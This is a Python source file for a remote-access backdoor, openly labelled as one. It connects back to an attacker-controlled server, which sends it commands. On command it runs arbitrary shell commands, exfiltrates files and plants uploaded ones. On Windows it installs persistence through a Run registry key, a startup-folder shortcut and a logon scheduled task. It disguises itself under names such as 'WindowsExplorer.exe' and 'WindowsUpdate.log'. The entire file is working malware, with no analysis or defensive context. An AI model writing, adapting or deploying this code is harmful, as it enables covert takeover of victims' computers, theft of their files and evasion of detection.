#!/usr/bin/env python
import socket
import subprocess
import json
import base64
import os
import platform
import time
import sys
import shutil
import winreg
import logging
import traceback

class Backdoor:
    def __init__(self):
        self.connection = None
        self.current_dir = os.getcwd()
        self.os_type = platform.system()
        self.BUFFER_SIZE = 1024 * 1024 * 4
        self.setup_logging()
        self.logger.info(f"Starting backdoor for {self.os_type}")
        self.connect_to_server()
        self.become_persistent()

    def setup_logging(self):
        self.logger = logging.getLogger('Backdoor')
        self.logger.setLevel(logging.DEBUG)
        
        # Create log file in AppData for Windows
        if self.os_type == "Windows":
            log_path = os.path.join(os.environ['APPDATA'], 'WindowsUpdate.log')
        else:
            log_path = os.path.join(os.path.expanduser('~'), '.system_update.log')
            
        handler = logging.FileHandler(log_path)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Also log to console
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

    def become_persistent(self):
        """Enhanced persistence with multiple methods and error handling"""
        try:
            if self.os_type != "Windows":
                self.logger.info("Skipping persistence for non-Windows OS")
                return
                
            current_executable = sys.executable
            if not current_executable or not os.path.exists(current_executable):
                self.logger.error("Current executable path not found")
                return
                
            # 1. Registry Run Key Method
            self.registry_persistence()
            
            # 2. Startup Folder Method
            self.startup_folder_persistence()
            
            # 3. Scheduled Task Method
            self.scheduled_task_persistence()
            
            self.logger.info("Persistence mechanisms installed")
            
        except Exception as e:
            self.logger.error(f"Persistence error: {str(e)}\n{traceback.format_exc()}")

    def registry_persistence(self):
        """Install persistence via registry"""
        try:
            evil_file_location = os.path.join(
                os.environ["APPDATA"],
                "WindowsExplorer.exe"
            )
            
            # Skip if already in persistence location
            if os.path.abspath(sys.executable).lower() == os.path.abspath(evil_file_location).lower():
                self.logger.info("Already running from persistence location")
                return
                
            # Copy file to AppData
            if not os.path.exists(evil_file_location):
                shutil.copy2(sys.executable, evil_file_location)
                self.logger.info(f"Copied to {evil_file_location}")
            
            # Add to registry
            reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_name = "WindowsExplorer"
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    reg_key,
                    0, 
                    winreg.KEY_WRITE
                )
                winreg.SetValueEx(
                    key, 
                    reg_name, 
                    0, 
                    winreg.REG_SZ, 
                    f'"{evil_file_location}"'
                )
                winreg.CloseKey(key)
                self.logger.info(f"Added registry key: {reg_name}")
            except Exception as e:
                self.logger.error(f"Registry write failed: {str(e)}")
                # Fallback to command method
                command = (
                    f'reg add HKCU\\{reg_key} '
                    f'/v "{reg_name}" '
                    f'/t REG_SZ '
                    f'/d "{evil_file_location}" '
                    f'/f'
                )
                result = subprocess.call(
                    command,
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE
                )
                if result == 0:
                    self.logger.info("Registry entry added via command")
                else:
                    self.logger.error("Failed to add registry entry")
                    
        except Exception as e:
            self.logger.error(f"Registry persistence failed: {str(e)}")

    def startup_folder_persistence(self):
        """Install persistence via startup folder"""
        try:
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft', 
                'Windows',
                'Start Menu',
                'Programs',
                'Startup'
            )
            os.makedirs(startup_path, exist_ok=True)
            
            shortcut_path = os.path.join(startup_path, "Windows Explorer.lnk")
            target_path = os.path.join(os.environ["APPDATA"], "WindowsExplorer.exe")
            
            # Create shortcut if it doesn't exist
            if not os.path.exists(shortcut_path):
                vbs_script = f"""
                Set oWS = WScript.CreateObject("WScript.Shell")
                sLinkFile = "{shortcut_path}"
                Set oLink = oWS.CreateShortcut(sLinkFile)
                oLink.TargetPath = "{target_path}"
                oLink.Save
                """
                
                # Create VBS script to make shortcut
                vbs_path = os.path.join(os.environ['TEMP'], 'create_shortcut.vbs')
                with open(vbs_path, 'w') as f:
                    f.write(vbs_script)
                    
                # Execute VBS script
                subprocess.call(
                    ['cscript.exe', vbs_path],
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE
                )
                
                # Cleanup
                os.remove(vbs_path)
                
                self.logger.info(f"Created startup shortcut at {shortcut_path}")
        except Exception as e:
            self.logger.error(f"Startup folder persistence failed: {str(e)}")

    def scheduled_task_persistence(self):
        """Install persistence via scheduled task"""
        try:
            task_name = "WindowsExplorerUpdate"
            target_path = os.path.join(os.environ["APPDATA"], "WindowsExplorer.exe")
            
            # Delete existing task if any
            subprocess.call(
                f'schtasks /Delete /TN "{task_name}" /F',
                shell=True,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE
            )
            
            # Create new task
            command = (
                f'schtasks /Create /TN "{task_name}" '
                '/SC ONLOGON '
                f'/TR "{target_path}" '
                '/RU %USERNAME% '
                '/F'
            )
            
            result = subprocess.call(
                command,
                shell=True,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE
            )
            
            if result == 0:
                self.logger.info(f"Scheduled task created: {task_name}")
            else:
                self.logger.error("Failed to create scheduled task")
        except Exception as e:
            self.logger.error(f"Scheduled task persistence failed: {str(e)}")

    def connect_to_server(self):
        while True:
            try:
                if self.connection:
                    self.connection.close()
                    
                # Dapatkan host dan port dari environment variable
                SERVER_HOST = os.getenv('SERVER_HOST')
                SERVER_PORT = int(os.getenv('SERVER_PORT', '5555'))
                
                if not SERVER_HOST:
                    self.logger.error("SERVER_HOST environment variable not set")
                    time.sleep(10)
                    continue
                    
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(3600)
                self.connection.connect((SERVER_HOST, SERVER_PORT))

                init_data = json.dumps({
                    "os": self.os_type,
                    "cwd": self.current_dir
                })
                self.connection.send(init_data.encode('utf-8'))
                self.logger.info(f"Connected to {SERVER_HOST}:{SERVER_PORT}")
                return
            except (socket.error, socket.timeout) as e:
                self.logger.warning(f"Connection error: {str(e)}, retrying in 5 seconds...")
                time.sleep(5)
            except Exception as e:
                self.logger.error(f"Unexpected error: {str(e)}")
                time.sleep(5)

    def reliable_send(self, data):
        try:
            if isinstance(data, dict) or isinstance(data, list):
                json_data = json.dumps(data)
            elif isinstance(data, bytes):
                json_data = json.dumps(base64.b64encode(data).decode('utf-8'))
            else:
                json_data = json.dumps(str(data))
                
            self.connection.sendall(json_data.encode('utf-8'))
        except (socket.error, OSError) as e:
            self.logger.error(f"Send error: {str(e)}")
            self.connect_to_server()

    def reliable_receive(self):
        json_data = b""
        start_time = time.time()
        timeout = 3600

        while True:
            if time.time() > start_time + timeout:
                raise TimeoutError("Receive timed out")

            try:
                chunk = self.connection.recv(4096)
                if not chunk:
                    return None
                json_data += chunk

                try:
                    decoded_data = json.loads(json_data.decode('utf-8', errors='replace'))
                    return decoded_data
                except json.JSONDecodeError:
                    continue
            except socket.timeout:
                continue
            except (socket.error, ConnectionResetError) as e:
                self.logger.error(f"Receive error: {str(e)}")
                self.connect_to_server()
                return None
            except Exception as e:
                self.logger.error(f"Unexpected error: {str(e)}")
                return None

    def read_file(self, path):
        try:
            path = path.strip()
            if path.startswith('"') and path.endswith('"'):
                path = path[1:-1]
                
            normalized_path = os.path.normpath(path)

            if not os.path.isabs(normalized_path):
                normalized_path = os.path.join(self.current_dir, normalized_path)

            if not os.path.exists(normalized_path):
                return {"error": f"[-] File not found: {normalized_path}"}

            if not os.path.isfile(normalized_path):
                return {"error": f"[-] Not a file: {normalized_path}"}

            file_size = os.path.getsize(normalized_path)
            file_name = os.path.basename(normalized_path)

            self.reliable_send({
                "file_size": file_size,
                "file_name": file_name
            })

            if file_size == 0:
                return None

            sent = 0
            start_time = time.time()
            last_print = start_time
            
            with open(normalized_path, "rb") as file:
                while True:
                    chunk = file.read(self.BUFFER_SIZE)
                    if not chunk:
                        break
                    
                    try:
                        self.connection.sendall(chunk)
                    except (BrokenPipeError, ConnectionResetError):
                        return {"error": "[-] Connection lost during download"}
                    
                    sent += len(chunk)
                    
                    current_time = time.time()
                    if current_time - last_print > 1.0:
                        progress = sent / file_size * 100
                        mb_sent = sent / (1024 * 1024)
                        speed = mb_sent / (current_time - start_time)
                        self.logger.info(f"Sending: {progress:.1f}% ({mb_sent:.2f} MB) - Speed: {speed:.2f} MB/s")
                        last_print = current_time
            
            self.logger.info(f"File sent successfully: {file_name} ({file_size/1024/1024:.2f} MB)")
            return None
        except Exception as e:
            return {"error": f"[-] Download error: {str(e)}"}

    def write_file(self, file_name, file_size):
        try:
            if file_size < 0:
                return "[-] Invalid file size (negative)"

            save_path = os.path.join(self.current_dir, file_name)
            absolute_path = os.path.abspath(save_path)

            os.makedirs(os.path.dirname(absolute_path), exist_ok=True)

            if file_size == 0:
                with open(absolute_path, "wb") as file:
                    pass
                return f"[+] Empty file created at {absolute_path}"

            received = 0
            start_time = time.time()
            last_print = start_time
            
            with open(absolute_path, "wb") as file:
                while received < file_size:
                    remaining = file_size - received
                    chunk_size = min(self.BUFFER_SIZE, remaining)

                    timeout = max(120, file_size / (1024 * 1024) * 5)
                    self.connection.settimeout(timeout)
                    
                    try:
                        chunk = self.connection.recv(chunk_size)
                    except socket.timeout as e:
                        return f"[-] Upload timed out at {received}/{file_size} bytes: {str(e)}"

                    if not chunk:
                        break
                        
                    file.write(chunk)
                    received += len(chunk)
                    
                    current_time = time.time()
                    if current_time - last_print > 1.0:
                        progress = received / file_size * 100
                        mb_received = received / (1024 * 1024)
                        speed = mb_received / (current_time - start_time)
                        self.logger.info(f"Receiving: {progress:.1f}% ({mb_received:.2f} MB) - Speed: {speed:.2f} MB/s")
                        last_print = current_time

            self.connection.settimeout(3600)

            if received == file_size:
                total_time = time.time() - start_time
                speed = (file_size / (1024 * 1024)) / total_time
                return f"[+] File uploaded successfully to {absolute_path} ({file_size/1024/1024:.2f} MB in {total_time:.1f}s, {speed:.2f} MB/s)"
            else:
                return f"[-] Upload incomplete. Received {received}/{file_size} bytes"
        except socket.timeout:
            return f"[-] Upload timed out. Received {received}/{file_size} bytes"
        except Exception as e:
            return f"[-] Upload error: {str(e)}"
        finally:
            self.connection.settimeout(3600)

    def change_working_directory(self, path):
        try:
            path = path.strip()
            if path.startswith('"') and path.endswith('"'):
                path = path[1:-1]
                
            if path == "~":
                path = os.path.expanduser("~")
            elif path.startswith("~/"):
                path = os.path.join(os.path.expanduser("~"), path[2:])

            if not os.path.isabs(path):
                path = os.path.join(self.current_dir, path)

            path = os.path.normpath(path)
            os.chdir(path)
            self.current_dir = os.getcwd()
            return f"[+] Changed working directory to {self.current_dir}"
        except Exception as e:
            return f"[-] cd error: {str(e)}"

    def execute_system_command(self, command):
        try:
            with open(os.devnull, 'wb') as DEVNULL:
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=DEVNULL,
                    stdin=DEVNULL,
                    cwd=self.current_dir
                )
            return output
        except subprocess.CalledProcessError as e:
            return f"Command failed: {str(e)}".encode()
        except Exception as e:
            return f"Error: {str(e)}".encode()

    def run(self):
        try:
            while True:
                try:
                    command_data = self.reliable_receive()
                    if command_data is None:
                        self.logger.warning("Connection lost, reconnecting...")
                        self.connect_to_server()
                        continue

                    if isinstance(command_data, dict):
                        cmd_type = command_data.get("type", "")
                        command = command_data.get("command", "")

                        if cmd_type == "cd":
                            result = self.change_working_directory(command)
                            self.reliable_send(json.dumps({
                                "result": result,
                                "cwd": self.current_dir
                            }))

                        elif cmd_type == "download":
                            result = self.read_file(command)
                            if result:
                                self.reliable_send(result)

                        elif cmd_type == "upload":
                            file_size = command_data.get("size", 0)
                            file_name = command_data.get("file_name", "uploaded_file")
                            if file_size < 0:
                                self.reliable_send("[-] Invalid file size for upload")
                            else:
                                result = self.write_file(file_name, file_size)
                                self.reliable_send(result)

                        elif cmd_type == "exec":
                            result = self.execute_system_command(command)
                            self.reliable_send(result)

                        elif command_data.get("command") == "exit":
                            self.reliable_send("[+] Closing connection")
                            self.connection.close()
                            self.logger.info("Connection closed by command")
                            sys.exit(0)

                except (ConnectionResetError, TimeoutError) as e:
                    self.logger.warning(f"Connection error: {str(e)}, reconnecting...")
                    self.connect_to_server()

        except Exception as e:
            self.logger.error(f"Runtime error: {str(e)}\n{traceback.format_exc()}")
        finally:
            if self.connection:
                self.connection.close()
            self.logger.info("Backdoor stopped")

if __name__ == '__main__':
    print(f"[*] Starting backdoor")
    backdoor = Backdoor()
    backdoor.run()